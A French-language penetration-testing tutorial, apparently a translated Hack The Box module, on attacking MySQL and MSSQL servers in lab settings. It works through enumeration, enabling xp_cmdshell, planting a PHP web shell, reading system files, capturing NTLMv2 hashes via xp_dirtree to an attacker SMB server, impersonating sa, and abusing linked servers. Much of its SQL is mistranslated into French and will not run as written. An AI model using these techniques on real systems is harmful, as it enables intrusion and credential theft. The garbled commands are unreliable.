# Attaquer une base SQL

MySQL et Microsoft SQL Server (MSSQL) sont des systèmes de gestion de bases de données relationnelles qui stockent les données dans des tables, des colonnes et des lignes. De nombreux systèmes de bases de données relationnelles comme MSSQL et MySQL utilisent le langage de requête structuré (SQL) pour interroger et maintenir la base de données.

Les hébergeurs de bases de données sont considérés comme des cibles de choix car ils sont responsables du stockage de toutes sortes de données sensibles, y compris, mais sans s'y limiter, les informations d'identification des utilisateurs, les informations personnelles identifiables (PII), les données commerciales et les informations de paiement. De plus, ces services sont souvent configurés avec des utilisateurs hautement privilégiés. Si nous accédons à une base de données, nous pourrons peut-être tirer parti de ces privilèges pour plus d'actions, y compris le mouvement latéral et l'escalade des privilèges.

## Énumération
Par défaut, MSSQL utilise les ports TCP/1433 et UDP/1434, et MySQL utilise TCP/3306. Cependant, lorsque MSSQL fonctionne en mode "caché", il utilise le port TCP/2433. Nous pouvons utiliser l'option -sC des scripts par défaut de Nmap pour énumérer les services de base de données sur un système cible :

```
dsgsec@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

L'analyse Nmap révèle des informations essentielles sur la cible, comme la version et le nom d'hôte, que nous pouvons utiliser pour identifier les erreurs de configuration courantes, les attaques spécifiques ou les vulnérabilités connues. Explorons quelques erreurs de configuration courantes et des attaques spécifiques au protocole.

## Mécanismes d'authentification
MSSQL prend en charge deux modes d'authentification, ce qui signifie que les utilisateurs peuvent être créés dans Windows ou SQL Server :
| Type d'authentification | Descriptif |
| --- | --- |
| `Mode d'authentification Windows` | Il s'agit de la sécurité par défaut, souvent appelée sécurité "intégrée", car le modèle de sécurité SQL Server est étroitement intégré à Windows/Active Directory. Des comptes d'utilisateurs et de groupes Windows spécifiques sont approuvés pour se connecter à SQL Server. Les utilisateurs Windows qui ont déjà été authentifiés n'ont pas à présenter d'informations d'identification supplémentaires. |
| `Mode mixte` | Le mode mixte prend en charge l'authentification par les comptes Windows/Active Directory et SQL Server. Les paires de nom d'utilisateur et de mot de passe sont conservées dans SQL Server. |

MySQL prend également en charge différentes méthodes d'authentification, telles que le nom d'utilisateur et le mot de passe, ainsi que l'authentification Windows (un plugin est requis). En outre, les administrateurs peuvent choisir un mode d'authentification pour de nombreuses raisons, notamment la compatibilité, la sécurité, la convivialité, etc. Cependant, selon la méthode mise en œuvre, des erreurs de configuration peuvent se produire.

Dans le passé, il y avait une vulnérabilité CVE-2012-2122 dans les serveurs MySQL 5.6.x, entre autres, qui nous permettait de contourner l'authentification en utilisant à plusieurs reprises le même mot de passe incorrect pour le compte donné car la vulnérabilité d'attaque temporelle existait dans la façon dont MySQL gérer les tentatives d'authentification.

Dans cette attaque temporelle, MySQL tente à plusieurs reprises de s'authentifier auprès d'un serveur et mesure le temps nécessaire au serveur pour répondre à chaque tentative. En mesurant le temps qu'il faut au serveur pour répondre, nous pouvons déterminer quand le mot de passe correct a été trouvé, même si le serveur n'indique pas de succès ou d'échec.

Dans le cas de MySQL 5.6.x, le serveur met plus de temps à répondre à un mot de passe incorrect qu'à un mot de passe correct. Ainsi, si nous essayons à plusieurs reprises de nous authentifier avec le même mot de passe incorrect, nous recevrons éventuellement une réponse indiquant que le mot de passe correct a été trouvé, même si ce n'est pas le cas.

### Mauvaises configurations
Une authentification mal configurée dans SQL Server peut nous permettre d'accéder au service sans informations d'identification si l'accès anonyme est activé, si un utilisateur sans mot de passe est configuré ou si tout utilisateur, groupe ou machine est autorisé à accéder à SQL Server.

## Privilèges
Selon les privilèges de l'utilisateur, nous pouvons être en mesure d'effectuer différentes actions au sein d'un serveur SQL, telles que :

- Lire ou modifier le contenu d'une base de données

- Lire ou modifier la configuration du serveur

- Exécuter des commandes

- Lire les fichiers locaux

- Communiquer avec d'autres bases de données

- Capturez le hachage du système local

- Usurper l'identité des utilisateurs existants

- Accéder à d'autres réseaux

Attaques spécifiques au protocole
-------------------------

Il est crucial de comprendre le fonctionnement de la syntaxe SQL. Nous pouvons utiliser le module gratuit [SQL Injection Fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) pour nous initier à la syntaxe SQL. Même si ce module couvre MySQL, les syntaxes MSSQL et MySQL sont assez similaires.

#### Lire/modifier la base de données

Imaginons que nous ayons accès à une base de données SQL. Tout d'abord, nous devons identifier les bases de données existantes sur le serveur, quelles tables la base de données contient et enfin, le contenu de chaque table. Gardez à l'esprit que nous pouvons trouver des bases de données avec des centaines de tables. Si notre objectif n'est pas seulement d'accéder aux données, nous devrons choisir les tables susceptibles de contenir des informations intéressantes pour poursuivre nos attaques, telles que les noms d'utilisateur et les mots de passe, les jetons, les configurations, etc. Voyons comment nous pouvons faire cela :

#### MySQL - Connexion au serveur SQL

```
dsgsec@htb[/htb]$ mysql -u juillet -pPassword123 -h 10.129.20.13

Bienvenue sur le moniteur MariaDB. Les commandes se terminent par ; ou \g.
Votre identifiant de connexion MySQL est 8
Version du serveur : 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab et autres.

Tapez 'aide;' ou '\h' pour obtenir de l'aide. Tapez '\c' pour effacer l'instruction d'entrée actuelle.

MySQL [(aucun)]>
```

#### Sqlcmd - Connexion au serveur SQL

Sqlcmd - Connexion au serveur SQL

```
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>

```

Remarque : Lorsque nous nous authentifions auprès de MSSQL à l'aide de `sqlcmd` , nous pouvons utiliser les paramètres `-y` (SQLCMDMAXVARTYPEWIDTH) et `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) pour obtenir une sortie plus attrayante. Gardez à l'esprit que cela peut affecter les performances.

Si nous ciblons `MSSQL` à partir de Linux, nous pouvons utiliser `sqsh` comme alternative à `sqlcmd` :

Sqlcmd - Connexion au serveur SQL

```
dsgsec@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MonMotDePasse !' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Parties Copyright (C) 2004-2014 Michael Peppler et Martin Wesdorp
Ceci est un logiciel gratuit avec ABSOLUMENT AUCUNE GARANTIE
Pour plus d'informations, tapez '\warranty'
1>

```

Alternativement, nous pouvons utiliser l'outil d'Impacket avec le nom `mssqlclient.py`.

Sqlcmd - Connexion au serveur SQL

```
dsgsec@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Mot de passe : MonMotDePasse !

[*] Cryptage requis, passage à TLS
[*] ENVCHANGE(DATABASE) : ancienne valeur : maître, nouvelle valeur : maître
[*] ENVCHANGE(LANGUAGE) : ancienne valeur : aucune, nouvelle valeur : us_english
[*] ENVCHANGE(TAILLE DE PAQUET) : ancienne valeur : 4096, nouvelle valeur : 16192
[*] INFO(WIN-02\SQLEXPRESS) : Ligne 1 : Modification du contexte de la base de données en 'maître'.
[*] INFO(WIN-02\SQLEXPRESS) : Ligne 1 : paramètre de langue modifié en us_english.
[*] ACK : Résultat : 1 - Microsoft SQL Server (120 7208)
[!] Appuyez sur help pour des commandes shell supplémentaires
SQL>

```

Remarque : Lorsque nous nous authentifions auprès de MSSQL à l'aide de `sqsh` nous pouvons utiliser les paramètres `-h` pour désactiver les en-têtes et les pieds de page afin d'obtenir une apparence plus claire.

Lors de l'utilisation de l'authentification Windows, nous devons spécifier le nom de domaine ou le nom d'hôte de la machine cible. Si nous ne spécifions pas de domaine ou de nom d'hôte, il assumera l'authentification SQL et s'authentifiera auprès des utilisateurs créés dans SQL Server. Au lieu de cela, si nous définissons le domaine ou le nom d'hôte, il utilisera l'authentification Windows. Si nous ciblons un compte local, nous pouvons utiliser `SERVERNAME\\accountname` ou `.\\accountname`. La commande complète ressemblerait à :

Sqlcmd - Connexion au serveur SQL

```
dsgsec@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MonMotDePasse !' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Parties Copyright (C) 2004-2014 Michael Peppler et Martin Wesdorp
Ceci est un logiciel gratuit avec ABSOLUMENT AUCUNE GARANTIE
Pour plus d'informations, tapez '\warranty'
1>

```

#### Bases de données SQL par défaut

Avant d'explorer l'utilisation de la syntaxe SQL, il est essentiel de connaître les bases de données par défaut pour `MySQL` et `MSSQL`. Ces bases de données contiennent des informations sur la base de données elle-même et nous aident à énumérer les noms de base de données, les tables, les colonnes, etc. Avec l'accès à ces bases de données, nous pouvons utiliser certaines procédures stockées du système, mais elles ne contiennent généralement pas de données d'entreprise.

Schémas/bases de données système par défaut de "MySQL" :

- `mysql` - est la base de données système qui contient les tables qui stockent les informations requises par le serveur MySQL
- `information_schema` - permet d'accéder aux métadonnées de la base de données
- `performance_schema` - est une fonctionnalité permettant de surveiller l'exécution du serveur MySQL à un niveau bas
- `sys` : un ensemble d'objets qui aide les administrateurs de bases de données et les développeurs à interpréter les données collectées par le schéma de performances

Schémas/bases de données système par défaut "MSSQL" :

- `master` - conserve les informations d'une instance de SQL Server.
- `msdb` : utilisé par l'Agent SQL Server.
- `model` - un modèle de base de données copié pour chaque nouvelle base de données.
- `resource` - une base de données en lecture seule qui maintient les objets système visibles dans chaque base de données sur le serveur dans le schéma sys.
- `tempdb` : conserve les objets temporaires pour les requêtes SQL.

#### Syntaxe SQL

#### Afficher les bases de données

Afficher les bases de données

```
mysql> AFFICHER LES BASES DE DONNÉES ;

+--------------------+
| Base de données |
+--------------------+
| information_schema |
| htbuseurs |
+--------------------+
2 rangées en série (0.00 sec)

```

Si nous utilisons `sqlcmd`, nous devrons utiliser `GO` après notre requête pour exécuter la syntaxe SQL.

Afficher les bases de données

```
1> SELECT nom DE master.dbo.sysdatabases
2> ALLER

nom
--------------------------------------------------
maître
tempdb
modèle
msdb
htbusers

```

#### Sélectionnez une base de données

Sélectionnez une base de données

```
mysql> UTILISER htbusers ;

Base de données modifiée

```

Sélectionnez une base de données

```
1> UTILISER les htbusers
2> ALLER

Changement du contexte de la base de données en 'htbusers'.

```

#### Afficher les tableaux

Afficher les tableaux

```
mysql> AFFICHER LES TABLES ;

+-----------------------------------+
| Tables_in_htbusers |
+-----------------------------------+
| gestes |
| autorisations |
| permissions_roles |
| permissions_users |
| rôles |
| rôles_utilisateurs |
| paramètres |
| utilisateurs |
+-----------------------------------+
8 lignes en série (0.00 sec)

```

Afficher les tableaux

```
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> ALLER

nom de la table
--------------------------------
Actions
autorisations
permissions_roles
permissions_users
les rôles
rôles_utilisateurs
paramètres
utilisateurs
(8 lignes concernées)

```

#### Sélectionnez toutes les données de la table "utilisateurs"

Sélectionnez toutes les données de la table "utilisateurs"

```
mysql> SELECT * FROM utilisateurs ;

+----+---------------+------------+--------------- ------+
| identifiant | nom d'utilisateur | mot de passe | date_d'adhésion |
+----+---------------+------------+--------------- ------+
| 1 | administrateur | p@ssw0rd | 2020-07-02 00:00:00 |
| 2 | administrateur | adm1n_p@ss | 2020-07-02 11:30:50 |
| 3 | jean | jean123 ! | 2020-07-02 11:47:16 |
| 4 | tom | tom123 ! | 2020-07-02 12:23:16 |
+----+---------------+------------+--------------- ------+
4 rangées en série (0.00 sec)

```

Sélectionnez toutes les données de la table "utilisateurs"

```
1> SÉLECTIONNER * DES utilisateurs
2> allez

id nom d'utilisateur mot de passe data_of_joining
----------- -------------------- ----------- --- --------------------
           1 administrateur p@ssw0rd 2020-07-02 00:00:00.000
           2 administrateur adm1n_p@ss 2020-07-02 11:30:50.000
           3 jean jean123 ! 2020-07-02 11:47:16.000
           4 tom tom123 ! 2020-07-02 12:23:16.000

(4 lignes concernées)

```

* * * * *

Exécuter des commandes
----------------

"L'exécution de commandes" est l'une des fonctionnalités les plus recherchées lors de l'attaque de services courants, car elle nous permet de contrôler le système d'exploitation. Si nous avons les privilèges appropriés, nous pouvons utiliser la base de données SQL pour exécuter des commandes système ou créer les éléments nécessaires pour le faire.

`MSSQL` a [procédures stockées étendues](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming ?view=sql-server-ver15) appelé [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view= sql-server-ver15) qui nous permettent d'exécuter des commandes système à l'aide de SQL. Gardez à l'esprit ce qui suit concernant `xp_cmdshell` :

- `xp_cmdshell` est une fonctionnalité puissante et désactivée par défaut. `xp_cmdshell` peut être activé et désactivé à l'aide de [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) ou en exécutant [ sp_configure] (https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- Le processus Windows généré par `xp_cmdshell` a les mêmes droits de sécurité que le compte de service SQL Server
- `xp_cmdshell` fonctionne de manière synchrone. Le contrôle n'est pas rendu à l'appelant tant que la commande command-shell n'est pas terminée

Pour exécuter des commandes à l'aide de la syntaxe SQL sur MSSQL, utilisez :

#### XP_CMDSHELL

XP_CMDSHELL

```
1> xp_cmdshell 'whoami'
2> ALLER

sortir
-----------------------------
pas de service\mssql$sqlexpress
NUL
(2 rangs concernés)

```

Si `xp_cmdshell` n'est pas activé, nous pouvons l'activer, si nous disposons des privilèges appropriés, à l'aide de la commande suivante :

Code : mssql

```
-- Pour permettre la modification des options avancées.
EXÉCUTER sp_configure 'afficher les options avancées', 1
ALLER

-- Pour mettre à jour la valeur actuellement configurée pour les options avancées.
RECONFIGURER
ALLER

-- Pour activer la fonction.
EXÉCUTER sp_configure 'xp_cmdshell', 1
ALLER

-- Pour mettre à jour la valeur actuellement configurée pour cette fonctionnalité.
RECONFIGURER
ALLER

```

Il existe d'autres méthodes pour obtenir l'exécution de commandes, telles que l'ajout de [procédures stockées étendues](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an- extended-stored-procedure-to-sql-server), [Assemblages CLR](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server- clr-integration), [Tâches de l'Agent SQL Server](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) et [external scripts] (https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). Cependant, en plus de ces méthodes, il existe également des fonctionnalités supplémentaires qui peuvent être utilisées comme la commande `xp_regwrite` qui est utilisée pour élever les privilèges en créant de nouvelles entrées dans le registre Windows. Néanmoins, ces méthodes sortent du cadre de ce module.

`MySQL` prend en charge les [fonctions définies par l'utilisateur](https://rsc.anu.edu.au/~rsccu/manuals/mySQL/refman-5.0-en.html-chapter/extending-mysql.html#adding-udf) qui nous permet d'exécuter du code C/C++ en tant que fonction dans SQL, il existe une fonction définie par l'utilisateur pour l'exécution de commandes dans ce [référentiel GitHub](https://github.com/mysqludf/lib_mysqludf_sys). Il n'est pas courant de rencontrer une fonction définie par l'utilisateur comme celle-ci dans un environnement de production, mais nous devons être conscients que nous pouvons l'utiliser.

* * * * *

Écrire des fichiers locaux
-----------------

`MySQL` n'a pas de procédure stockée comme `xp_cmdshell`, mais nous pouvons exécuter des commandes si nous écrivons à un emplacement du système de fichiers qui peut exécuter nos commandes. Par exemple, supposons que `MySQL` fonctionne sur un serveur Web basé sur PHP ou sur d'autres langages de programmation comme ASP.NET. Si nous avons les privilèges appropriés, nous pouvons essayer d'écrire un fichier en utilisant [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) dans le répertoire du serveur Web. Ensuite, nous pouvons naviguer jusqu'à l'emplacement où se trouve le fichier et exécuter nos commandes.

#### MySQL - Écrire un fichier local

MySQL - Écrire un fichier local

```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Requête OK, 1 ligne affectée (0,001 s)

```

Dans `MySQL`, une variable système globale [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limite l'effet des opérations d'importation et d'exportation de données , telles que celles effectuées par les instructions `LOAD DATA` et `SELECT ... INTO OUTFILE` et les instructions [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions .html#function_load-file) fonction. Ces opérations ne sont autorisées qu'aux utilisateurs disposant du privilège [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) .

`secure_file_priv` peut être défini comme suit :

- Si vide, la variable n'a aucun effet, ce qui n'est pas un paramètre sécurisé.
- Si défini sur le nom d'un répertoire, le serveur limite les opérations d'importation et d'exportation à Travaillez uniquement avec les fichiers de ce répertoire. Le répertoire doit exister ; le serveur ne le crée pas.
- S'il est défini sur NULL, le serveur désactive les opérations d'importation et d'exportation.

Dans l'exemple suivant, nous pouvons voir que la variable `secure_file_priv` est vide, ce qui signifie que nous pouvons lire et écrire des données à l'aide de `MySQL` :

#### MySQL - Privilèges de fichiers sécurisés

MySQL - Privilèges de fichiers sécurisés

```
mysql> affiche des variables comme "secure_file_priv" ;

+-----------------+-------+
| nom_variable | Valeur |
+-----------------+-------+
| secure_file_priv | |
+-----------------+-------+

1 rangée en série (0,005 s)

```

Pour écrire des fichiers à l'aide `MSSQL`, nous devons activer [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server- configuration-option), qui nécessite des privilèges d'administrateur, puis exécutez certaines procédures stockées pour créer le fichier :

#### MSSQL - Activer les procédures d'automatisation Ole

MSSQL - Activer les procédures d'automatisation Ole

```
1> sp_configure 'afficher les options avancées', 1
2> ALLER
3> RECONFIGURER
4> ALLER
5> sp_configure 'Procédures d'automatisation Ole', 1
6> ALLER
7> RECONFIGURER
8> ALLER

```

#### MSSQL - Créer un fichier

MSSQL - Créer un fichier

```
1> DÉCLARER @OLE INT
2> DÉCLARER @FileID INT
3> EXÉCUTER sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXÉCUTER sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXÉCUTER sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXÉCUTER sp_OADestroy @IDFichier
7> EXÉCUTER sp_OADestroy @OLE
8> ALLER

```

* * * * *

Lire les fichiers locaux
----------------

Par défaut, `MSSQL` autorise la lecture de fichiers sur n'importe quel fichier du système d'exploitation auquel le compte dispose d'un accès en lecture. Nous pouvons utiliser la requête SQL suivante :

#### Lire les fichiers locaux dans MSSQL

Lire les fichiers locaux dans MSSQL

```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) COMME Contenu
2> ALLER

Colonne en vrac

-------------------------------------------------- ---------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# Ceci est un exemple de fichier HOSTS utilisé par Microsoft TCP/IP pour Windows.
#
# Ce fichier contient les mappages des adresses IP aux noms d'hôtes. Chaque
L'entrée # doit être conservée sur une ligne individuelle. L'adresse IP doit

(1 lignes concernées)

```

Comme nous l'avons mentionné précédemment, par défaut, une installation `MySQL` n'autorise pas la lecture arbitraire de fichiers, mais si les paramètres corrects sont en place et avec les privilèges appropriés, nous pouvons lire les fichiers en utilisant les méthodes suivantes :

#### MySQL - Lire les fichiers locaux dans MySQL

#### MySQL - Lire les fichiers locaux dans MySQL

MySQL - Lire des fichiers locaux dans MySQL

```
mysql> sélectionnez LOAD_FILE("/etc/passwd");

+-----------------------------------+
| CHARGER_FICHIER("/etc/passwd")
+------------------------------------------------------------- -+
racine:x:0:0:racine:/racine:/bin/bash
démon:x:1:1:démon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>

```

* * * * *

Capturer le hachage du service MSSQL
--------------------------

Dans la section `Attaquer SMB` , nous avons expliqué que nous pouvions créer un faux serveur SMB pour voler un hachage et abuser d'une implémentation par défaut dans un système d'exploitation Windows. Nous pouvons également voler le hachage du compte de service MSSQL à l'aide de procédures stockées `xp_subdirs` ou `xp_dirtree` non documentées, qui utilisent le protocole SMB pour récupérer une liste de répertoires enfants sous un répertoire parent spécifié à partir du système de fichiers. Lorsque nous utilisons l'une de ces procédures stockées et que nous la pointons vers notre serveur SMB, la fonctionnalité d'écoute d'annuaire force le serveur à s'authentifier et à envoyer le hachage NTLMv2 du compte de service qui exécute le serveur SQL.

Pour que cela fonctionne, nous devons d'abord démarrer [Responder](https://github.com/lgandx/Responder) ou [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) et exécuter l'une des requêtes SQL suivantes :

#### XP_DIRTREE Vol de hachage

Vol de hachage XP_DIRTREE

```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> ALLER

profondeur de sous-répertoire
--------------- -----------

```

#### Vol de hachage XP_SUBDIRS

Vol de hachage XP_SUBDIRS

```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> ALLER

HResult 0x55F6, niveau 16, état 1
xp_subdirs n'a pas pu accéder à '\\10.10.110.17\share\*.*' : FindFirstFile() a renvoyé l'erreur 5, 'L'accès est refusé.'

```

Si le compte de service a accès à notre serveur, nous obtiendrons son hachage. Nous pouvons alors tenter de casser le hachage ou de le relayer vers un autre hôte.

#### XP_SUBDIRS Hash Stealing avec Responder

Vol de hachage XP_SUBDIRS avec répondeur

```
dsgsec@htb[/htb]$ répondeur sudo -I tun0

                                          __
   .----.-----.-----.-----.-----.-----.--| |.-----.----.
   | _| -__|__ --| _ | _ | | _ || -__| _|
   |__| |_____|_____| __|_____|__|__|_____||_____|__|
                    |__|
<SNIP>

[+] A l'écoute des événements...

[SMB] Client NTLMv2-SSP : 10.10.110.17
[SMB] Nom d'utilisateur NTLMv2-SSP : SRVMSSQL\demouser


```

#### XP_SUBDIRS Hash Stealing avec impacket

XP_SUBDIRS Hash Stealing avec impacket

```
dsgsec@htb[/htb]$ partage sudo impacket-smbserver ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Fichier de configuration analysé
[*] Rappel ajouté pour UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Rappel ajouté pour UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Fichier de configuration analysé
[*] Fichier de configuration analysé
[*] Fichier de configuration analysé
[*] Connexion entrante (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] Utilisateur WINSRV02\mssqlsvc authentifié avec succès

[*] Fermeture de la connexion (10.129.203.7,49728)
[*] Connexions restantes []

```

* * * * *

Emprunter l'identité d'utilisateurs existants avec MSSQL
-------------------------------------

SQL Server dispose d'une autorisation spéciale, nommée `IMPERSONATE`, qui permet à l'utilisateur exécutant de prendre les autorisations d'un autre utilisateur ou de se connecter jusqu'à ce que le contexte soit réinitialisé ou que la session se termine. Voyons comment le privilège `IMPERSONATE` peut entraîner une élévation des privilèges dans SQL Server.

Tout d'abord, nous devons identifier les utilisateurs que nous pouvons usurper. Les administrateurs système peuvent se faire passer pour n'importe qui par défaut, mais pour les utilisateurs non-administrateurs, les privilèges doivent être explicitement attribués. Nous pouvons utiliser la requête suivante pour identifier les utilisateurs que nous pouvons usurper :

#### Identifiez les utilisateurs que nous pouvons usurper

Identifier les utilisateurs que nous pouvons usurper

```
1> SELECT distinct b.name
2> À PARTIR de sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> ALLER

nom
-----------------------------------------------
sa
Ben
valentin

(3 rangs concernés)

```

Pour avoir une idée des possibilités d'élévation de privilèges, vérifions si notre utilisateur actuel a le rôle sysadmin :

#### Vérification de notre utilisateur et de notre rôle actuels

Vérification de notre utilisateur et de notre rôle actuels

```
1> SÉLECTIONNER SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> allez

-----------
juillet

(1 lignes concernées)

-----------
           0

(1 lignes concernées)

```

Comme l'indique la valeur renvoyée `0` , nous n'avons pas le rôle d'administrateur système, mais nous pouvons emprunter l'identité de l'utilisateur `sa` . Prenons l'identité de l'utilisateur et exécutons les mêmes commandes. Pour emprunter l'identité d'un utilisateur, nous pouvons utiliser l'instruction Transact-SQL `EXECUTE AS LOGIN` et la définir sur l'utilisateur que nous voulons emprunter.

#### Usurper l'identité de l'utilisateur SA

Usurper l'identité de l'utilisateur SA

```
1> EXÉCUTER COMME LOGIN = 'sa'
2> SÉLECTIONNER SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> ALLER

-----------
sa

(1 lignes concernées)

-----------
           1

(1 lignes concernées)

```

Remarque : Il est recommandé d'exécuter `EXECUTE AS LOGIN` dans la base de données principale, car tous les utilisateurs, par défaut, ont accès à cette base de données. Si un utilisateur que vous essayez d'emprunter n'a pas accès à la base de données à laquelle vous vous connectez, une erreur s'affichera. Essayez de passer à la base de données principale à l'aide de `USE master`.

Nous pouvons désormais exécuter n'importe quelle commande en tant qu'administrateur système, comme l'indique la valeur renvoyée `1`. Pour annuler l'opération et revenir à notre utilisateur précédent, nous pouvons utiliser l'instruction Transact-SQL `REVERT`.

Remarque : Si nous trouvons un utilisateur qui n'est pas administrateur système, nous pouvons toujours vérifier s'il a accès à d'autres bases de données ou serveurs liés.

* * * * *

Communiquer avec d'autres bases de données avec MSSQL
------------------------------------------------

`MSSQL` a une option de configuration appelée [serveurs liés](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine ). Les serveurs liés sont généralement configurés pour permettre au moteur de base de données d'exécuter une instruction Transact-SQL qui inclut des tables dans une autre instance de SQL Server ou un autre produit de base de données tel qu'Oracle.

Si nous parvenons à accéder à un serveur SQL avec un serveur lié configuré, nous pourrons peut-être nous déplacer latéralement vers ce serveur de base de données. Les administrateurs peuvent configurer un serveur lié à l'aide des informations d'identification du serveur distant. Si ces informations d'identification ont des privilèges d'administrateur système, nous pourrons peut-être exécuter des commandes dans l'instance SQL distante. Voyons comment nous pouvons identifier et exécuter des requêtes sur des serveurs liés.

#### Identifier les serveurs liés dans MSSQL

Identifier les serveurs liés dans MSSQL

```
1> SELECT srvname, isremote FROM sysservers
2> ALLER

nom_serveur est distant
----------------------------------- --------
BUREAU-MFERMN4\SQLEXPRESS 1
10.0.0.12\SQLEXPRESS 0

(2 rangs concernés)

```

Comme nous pouvons le voir dans le résultat de la requête, nous avons le nom du serveur et la colonne `isremote`, où `1` signifie qu'il s'agit d'un serveur distant et `0` est un serveur lié. Nous pouvons voir [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) pour plus d'informations.

Ensuite, nous pouvons tenter d'identifier l'utilisateur utilisé pour la connexion et ses privilèges. L'instruction [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) peut être utilisée pour envoyer des commandes directes aux serveurs liés. Nous ajoutons notre commande entre parenthèses et spécifions le serveur lié entre crochets (`[ ]`).

Identifier les serveurs liés dans MSSQL

```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> ALLER

------------------------------ -------------------- ---------- ------------------------------ ---------- -
DESKTOP-0L9D4KA\SQLEXPRESS Microsoft SQL Server 2019 (RTM sa_remote 1

(1 lignes concernées)

```

Remarque : Si nous devons utiliser des guillemets dans notre requête au serveur lié, nous devons utiliser des guillemets doubles simples pour échapper au guillemet simple. Pour exécuter plusieurs commandes à la fois, nous pouvons les diviser par un point-virgule (;).

